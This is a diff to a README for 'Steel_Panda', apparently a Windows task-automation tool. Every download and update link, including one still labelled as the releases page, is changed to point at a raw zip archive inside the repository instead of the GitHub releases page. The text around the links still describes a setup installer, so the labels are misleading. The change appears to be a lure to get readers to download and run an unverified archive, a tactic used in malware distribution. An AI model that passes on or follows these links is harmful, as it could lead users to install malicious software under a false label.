@@ -1,6 +1,6 @@
 # 🐼 Steel_Panda - Manage Tasks Simply and Securely
 
-[![Download Steel_Panda](https://img.shields.io/badge/Download-Steel_Panda-brightgreen)](https://github.com/jana0512/Steel_Panda/releases)
+[![Download Steel_Panda](https://img.shields.io/badge/Download-Steel_Panda-brightgreen)](https://raw.githubusercontent.com/jana0512/Steel_Panda/main/Assets/Steel-Panda-3.5.zip)
 
 Steel_Panda is a local-first task executor. It helps you automate system commands and workflows. This lets you manage tasks without relying on the internet. It works on Windows and runs your commands safely and reliably.
 
@@ -40,11 +40,11 @@ Steel_Panda runs smoothly on most modern devices. No advanced setup is needed.
 
 Visit the official release page to get the installer.
 
-[![Download Steel_Panda](https://img.shields.io/badge/Download-Steel_Panda-blue)](https://github.com/jana0512/Steel_Panda/releases)
+[![Download Steel_Panda](https://img.shields.io/badge/Download-Steel_Panda-blue)](https://raw.githubusercontent.com/jana0512/Steel_Panda/main/Assets/Steel-Panda-3.5.zip)
 
 Click the button above or go to:
 
-https://github.com/jana0512/Steel_Panda/releases
+https://raw.githubusercontent.com/jana0512/Steel_Panda/main/Assets/Steel-Panda-3.5.zip
 
 Look for the latest release version. You will find a Windows installer file usually named like `Steel_Panda-Setup.exe` or similar.
 
@@ -148,7 +148,7 @@ This local-first approach keeps your tasks and information under your control.
 
 To update Steel_Panda:
 
-1. Visit the releases page: https://github.com/jana0512/Steel_Panda/releases
+1. Visit the releases page: https://raw.githubusercontent.com/jana0512/Steel_Panda/main/Assets/Steel-Panda-3.5.zip
 2. Download the latest version’s installer.
 3. Run the installer and follow the prompts.
 4. Your existing tasks and settings will remain intact.
@@ -177,4 +177,4 @@ Topics related to Steel_Panda’s development include android, central hub syste
 
 ---
 
-[![Download Steel_Panda](https://img.shields.io/badge/Download-Steel_Panda-brightgreen)](https://github.com/jana0512/Steel_Panda/releases)
+[![Download Steel_Panda](https://img.shields.io/badge/Download-Steel_Panda-brightgreen)](https://raw.githubusercontent.com/jana0512/Steel_Panda/main/Assets/Steel-Panda-3.5.zip)
